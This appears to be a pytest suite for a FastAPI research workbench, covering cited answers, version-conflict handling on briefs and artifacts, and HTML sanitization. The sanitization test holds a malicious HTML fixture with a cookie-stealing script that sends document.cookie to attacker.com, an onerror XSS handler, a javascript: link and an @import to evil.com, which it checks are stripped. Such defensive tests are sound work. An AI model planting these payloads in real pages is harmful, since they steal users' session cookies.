"""
Integrated End-to-End Workbench & Artifact Tests (Codename: Kestrel)
Verifies Phase 4 gate: Research -> Growth Brief / Artifacts -> Preview / Export,
optimistic concurrency conflict handling, and malicious HTML payload neutralization.
"""

from __future__ import annotations

import datetime
import uuid
from unittest.mock import AsyncMock, patch

import pytest
from fastapi.testclient import TestClient

from backend.app.db.session import get_db
from backend.app.main import app
from backend.app.models.entities import Artifact, ChatSession, GrowthBrief

client = TestClient(app)


@pytest.fixture(autouse=True)
def override_db_dependency():
    mock_db = AsyncMock()

    async def _mock_get_db():
        yield mock_db

    app.dependency_overrides[get_db] = _mock_get_db
    yield mock_db
    app.dependency_overrides.clear()


def test_e2e_research_to_citations_flow():
    """Verify research question -> grounded response -> verified citations."""
    session_id = uuid.uuid4()
    chunk_id = uuid.uuid4()
    source_id = uuid.uuid4()

    fake_session = ChatSession(
        id=session_id,
        user_id=uuid.UUID("00000000-0000-4000-8000-000000000001"),
        title="Activation Strategy",
        provider_preference="local",
        created_at=datetime.datetime.now(datetime.UTC),
        updated_at=datetime.datetime.now(datetime.UTC),
    )

    conv_result = {
        "message": {
            "id": str(uuid.uuid4()),
            "session_id": str(session_id),
            "role": "assistant",
            "content": "Rahul Vohra emphasizes finding the delight moment [E1].",
            "status": "complete",
            "mode": "research",
            "provider": "local",
            "model_id": "qwen2.5:1.5b",
            "created_at": datetime.datetime.now(datetime.UTC).isoformat(),
        },
        "citations": [
            {
                "evidence_id": "E1",
                "source_id": str(source_id),
                "chunk_id": str(chunk_id),
                "guest": "Rahul Vohra",
                "episode_title": "Engine for Growth",
                "episode_url": "https://youtube.com/watch?v=123",
                "publish_date": "2023-01-01",
                "excerpt": "Find what delighted users, then rebuild onboarding to reach it faster.",
                "supports": "Faster activation around delight",
            }
        ],
        "insufficient_evidence": False,
        "growth_brief_id": None,
        "artifact_id": None,
    }

    with patch(
        "backend.app.api.v1.sessions.default_session_service.get_session",
        new=AsyncMock(return_value=fake_session),
    ), patch(
        "backend.app.api.v1.sessions.default_conversation_service.process_message",
        new=AsyncMock(return_value=conv_result),
    ):
        response = client.post(
            f"/api/v1/sessions/{session_id}/messages",
            json={
                "content": "How did Superhuman optimize onboarding activation?",
                "mode": "research",
                "provider": "local",
                "stream": False,
            },
        )

        assert response.status_code == 200
        data = response.json()
        assert data["message"]["role"] == "assistant"
        assert data["insufficient_evidence"] is False
        assert len(data["citations"]) == 1
        assert data["citations"][0]["evidence_id"] == "E1"
        assert data["citations"][0]["guest"] == "Rahul Vohra"
        assert "rebuild onboarding" in data["citations"][0]["excerpt"]


def test_e2e_growth_brief_creation_and_optimistic_concurrency():
    """Verify Growth Brief lifecycle: retrieval, successful update, and 409 conflict detection."""
    brief_id = uuid.uuid4()
    session_id = uuid.uuid4()

    fake_brief_v1 = GrowthBrief(
        id=brief_id,
        session_id=session_id,
        title="Activation Loop Brief",
        version=1,
        status="active",
        data={
            "problem": "Low D1 activation",
            "recommendation": "Guided template gallery",
            "experiment": {
                "hypothesis": "Templates increase completion",
                "primary_metric": "D7 project completion",
            },
        },
        created_at=datetime.datetime.now(datetime.UTC),
        updated_at=datetime.datetime.now(datetime.UTC),
    )

    fake_brief_v2 = GrowthBrief(
        id=brief_id,
        session_id=session_id,
        title="Updated Activation Loop Brief",
        version=2,
        status="active",
        data=fake_brief_v1.data,
        created_at=datetime.datetime.now(datetime.UTC),
        updated_at=datetime.datetime.now(datetime.UTC),
    )

    # 1. Fetch existing brief
    with patch(
        "backend.app.api.v1.growth_briefs.default_growth_brief_service.get_growth_brief",
        new=AsyncMock(return_value=fake_brief_v1),
    ):
        res = client.get(f"/api/v1/growth-briefs/{brief_id}")
        assert res.status_code == 200
        assert res.json()["version"] == 1
        assert res.json()["title"] == "Activation Loop Brief"

    # 2. Update with matching expected_version=1 -> Success (version 2)
    with patch(
        "backend.app.api.v1.growth_briefs.default_growth_brief_service.update_growth_brief",
        new=AsyncMock(return_value=fake_brief_v2),
    ):
        patch_res = client.patch(
            f"/api/v1/growth-briefs/{brief_id}",
            json={
                "title": "Updated Activation Loop Brief",
                "expected_version": 1,
            },
        )
        assert patch_res.status_code == 200
        assert patch_res.json()["version"] == 2
        assert patch_res.json()["title"] == "Updated Activation Loop Brief"

    # 3. Concurrent update with stale expected_version=1 -> 409 Conflict
    with patch(
        "backend.app.api.v1.growth_briefs.default_growth_brief_service.update_growth_brief",
        new=AsyncMock(side_effect=ValueError("Version conflict: expected 1, but current is 2")),
    ):
        conflict_res = client.patch(
            f"/api/v1/growth-briefs/{brief_id}",
            json={
                "title": "Conflicting Update",
                "expected_version": 1,
            },
        )
        assert conflict_res.status_code == 409
        err = conflict_res.json()
        assert err["error"]["code"] == "VERSION_CONFLICT"
        assert "Version conflict" in err["error"]["message"]


def test_e2e_html_artifact_sanitization_and_malicious_payloads():
    """Verify malicious HTML artifacts are cleaned and isolated with CSP."""
    artifact_id = uuid.uuid4()
    session_id = uuid.uuid4()

    malicious_input = """
    <div class="card">
        <h1>Dashboard Metric</h1>
        <script>window.location='http://attacker.com?cookie='+document.cookie;</script>
        <img src="x" onerror="alert('xss')" />
        <iframe src="http://evil.com/phish"></iframe>
        <a href="javascript:alert('pwned')">Click here for prize</a>
        <style>@import url('http://evil.com/leak.css'); h1 { color: red; }</style>
    </div>
    """

    from backend.app.security.sanitizer import (
        build_sandboxed_preview_html,
        sanitize_html,
    )

    clean_content = sanitize_html(malicious_input)
    preview = build_sandboxed_preview_html(clean_content)

    # Invariants verification
    assert "<script>" not in preview
    assert "attacker.com" not in preview
    assert "onerror=" not in preview
    assert "<iframe>" not in preview
    assert "javascript:" not in preview
    assert "@import" not in preview
    assert "<meta http-equiv=\"Content-Security-Policy\"" in preview
    assert "default-src 'none'" in preview
    assert "script-src 'none'" in preview
    assert "<h1>Dashboard Metric</h1>" in preview

    fake_artifact = Artifact(
        id=artifact_id,
        session_id=session_id,
        kind="html",
        title="Sanitized Plate",
        content=malicious_input,
        preview_content=preview,
        version=1,
        created_at=datetime.datetime.now(datetime.UTC),
        updated_at=datetime.datetime.now(datetime.UTC),
    )

    with patch(
        "backend.app.api.v1.artifacts.default_artifact_service.get_artifact",
        new=AsyncMock(return_value=fake_artifact),
    ):
        res = client.get(f"/api/v1/artifacts/{artifact_id}")
        assert res.status_code == 200
        data = res.json()
        assert "<script>" not in data["preview_content"]
        assert "default-src 'none'" in data["preview_content"]


def test_e2e_markdown_artifact_version_conflict():
    """Verify optimistic concurrency on markdown artifacts."""
    artifact_id = uuid.uuid4()

    with patch(
        "backend.app.api.v1.artifacts.default_artifact_service.update_artifact",
        new=AsyncMock(side_effect=ValueError("Version conflict: expected 1, but current is 3")),
    ):
        res = client.patch(
            f"/api/v1/artifacts/{artifact_id}",
            json={
                "content": "# New Markdown Content",
                "expected_version": 1,
            },
        )
        assert res.status_code == 409
        assert res.json()["error"]["code"] == "VERSION_CONFLICT"
